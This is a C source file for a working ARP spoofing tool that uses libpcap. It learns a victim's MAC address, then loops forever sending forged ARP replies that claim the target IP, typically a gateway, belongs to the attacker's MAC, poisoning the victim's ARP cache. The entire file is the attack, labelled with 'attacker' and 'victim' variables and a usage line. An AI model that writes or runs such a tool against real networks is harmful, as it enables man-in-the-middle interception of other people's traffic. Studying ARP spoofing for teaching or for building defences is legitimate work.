#include<stdio.h>
#include<pcap.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>	// ioctl
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<net/if.h>	// ifreq
#include<sys/socket.h>
#include<arpa/inet.h>

#define MAC_ALEN 6	// MAC Address Length
#define IP_ALEN 4	// IP Address Length
#define ETH_PLEN 14	// Ethernet Packet Length
#define ARP_PLEN 28	// ARP Packet Length
#define PACKET_SIZE ETH_PLEN + ARP_PLEN
#define BUFSIZE 1024*8	// 8Byte

#pragma pack(1)
struct arpheader {
	uint16_t	hd_type;			/* format of hardware address */
	uint16_t	pro_type;			/* format of protocol address */
	uint8_t		hd_len;				/* length of hardware address */
	uint8_t		pro_len;			/* length of protocol address */
	uint16_t	op_code;			/* one of: */
	uint8_t		sender_hd_addr[MAC_ALEN];	/* sender hardware address */
	uint32_t	sender_pro_addr;		/* sender protocol address */
	uint8_t		target_hd_addr[MAC_ALEN];	/* target hardware address */
	uint32_t	target_pro_addr;		/* target protocol address */
};
#pragma (pop)

void usage(){
	printf("Usage	: arp_spoof [dev] [victim_ip] [target_ip]\n");
	printf("Example	: arp_spoof eth0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char *argv[]){

	u_char packet[128];
	const u_char *buf;

	struct arpheader *arp_header;
	struct ether_header *eth_header;

	int fd, res;
	struct ifreq ifr;

	unsigned char attacker_mac[MAC_ALEN];
	unsigned char victim_mac[MAC_ALEN];
	const char *attacker_ip;
	char *dev, *victim_ip, *target_ip;

	// pcap
	struct pcap_pkthdr *pcap_header;
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];		// PCAP_ERRBUF_SIZE : 256 (define pcap.h)

	if(argc != 4){
		usage();
		return -1;
	}

	dev = argv[1];
	victim_ip = argv[2];
	target_ip = argv[3];

	// Get Attacker MAC Address
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0){
		printf("[!] Socket Error!\n");
		return -1;
	}
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
		printf("[!] No Search Device!!\n");
		usage();
		return -1;
	}

	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

	// Get Attacker IP Address
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	attacker_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

	// Print Attacker Info
	printf("============================================\n");
	printf("Attacker IP 	: %s\n",attacker_ip);
	printf("Attacker MAC 	: %02X:%02X:%02X:%02X:%02X:%02X\n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);
	printf("============================================\n");

	/*========== Setting ARP Request Packet ==========*/
	// Make Ethernet Packet
	eth_header = (struct ether_header*)packet;
	eth_header->ether_type = ntohs(ETHERTYPE_ARP);	// ETHERTYPE_ARP : 0x0806 (define ethernet.h)
	for(int i=0 ; i<ETHER_ADDR_LEN ; i++){		// ETHER_ADDR_LEN : 6 (define ethernet.h -> linux/if_ether.h)
		eth_header->ether_dhost[i] = '\xff';
		eth_header->ether_shost[i] = attacker_mac[i];
	}

	// Make ARP Packet
	arp_header = (struct arpheader*)(packet+ETH_PLEN);
	arp_header->hd_type = ntohs(ARPHRD_ETHER);	// ARPHRD_ETHER : 1 (define net/if_arp.h)
	arp_header->pro_type = ntohs(ETHERTYPE_IP);	// ETHERTYPE_IP : 0x0800 (define net/ethernet.h)
	arp_header->hd_len = ETHER_ADDR_LEN;		// Sender hadrdware address length
	arp_header->pro_len = IP_ALEN;			// Sender ip address length
	arp_header->op_code = ntohs(ARPOP_REQUEST);	// ARPOP_REQUEST : 1 (define net/if_arp.h)
	memcpy(arp_header->sender_hd_addr, attacker_mac, MAC_ALEN);
	arp_header->sender_pro_addr = inet_addr(target_ip);
	memset(arp_header->target_hd_addr, 0, MAC_ALEN);
	arp_header->target_pro_addr = inet_addr(victim_ip);

	if((handle = pcap_open_live(dev, BUFSIZE, 1, 1, errbuf)) == NULL){
		printf("[!] Open Device Error %s : %s\n", dev, errbuf);
		return -1;
	}
	/*=================================================*/

	// Send ARP Request
	pcap_sendpacket(handle, packet, PACKET_SIZE);

	// Get Victim MAC Address
	res = pcap_next_ex(handle, &pcap_header, &buf);

	for(int i=0 ; i<MAC_ALEN ; i++)
		victim_mac[i] = buf[6+i];

	// Print Victim Info
	printf("Victim IP	: %s\n", victim_ip);
	printf("Victim MAC	: %02X:%02X:%02X:%02X:%02X:%02X\n", victim_mac[0], victim_mac[1], victim_mac[2], victim_mac[3], victim_mac[4], victim_mac[5]);

	/*========== Setting ARP Reply Packet ==========*/
	// Make Ethernet Packet
	eth_header = (struct ether_header*)packet;
	eth_header->ether_type = ntohs(ETHERTYPE_ARP);	// ETHERTYPE_ARP : 0x0806 (define ethernet.h)
	for(int i=0 ; i<ETHER_ADDR_LEN ; i++){		// ETHER_ADDR_LEN : 6 (define ethernet.h -> linux/if_ether.h)
		eth_header->ether_dhost[i] = victim_mac[i];
		eth_header->ether_shost[i] = attacker_mac[i];
	}

	// Make ARP Packet
	arp_header = (struct arpheader*)(packet+ETH_PLEN);
	arp_header->hd_type = ntohs(ARPHRD_ETHER);	// ARPHRD_ETHER : 1 (define net/if_arp.h)
	arp_header->pro_type = ntohs(ETHERTYPE_IP);	// ETHERTYPE_IP : 0x0800 (define net/ethernet.h)
	arp_header->hd_len = ETHER_ADDR_LEN;		// Sender hadrdware address length
	arp_header->pro_len = IP_ALEN;			// Sender ip address length
	arp_header->op_code = ntohs(ARPOP_REPLY);	// ARPOP_REPLY : 2 (define net/if_arp.h)
	memcpy(arp_header->sender_hd_addr, attacker_mac, MAC_ALEN);
	arp_header->sender_pro_addr = inet_addr(target_ip);
	memcpy(arp_header->target_hd_addr, victim_mac, MAC_ALEN);
	arp_header->target_pro_addr = inet_addr(victim_ip);

	if((handle = pcap_open_live(dev, BUFSIZE, 1, 1, errbuf)) == NULL){
		printf("[!] Open Device Error %s : %s\n", dev, errbuf);
		return -1;
	}
	/*==============================================*/

	// Send ARP Reply
	while(1){
		printf("[+] Send ARP Spoofing Packet...\n");
		pcap_sendpacket(handle, packet, PACKET_SIZE);
		sleep(1);
	}
	return 0;
}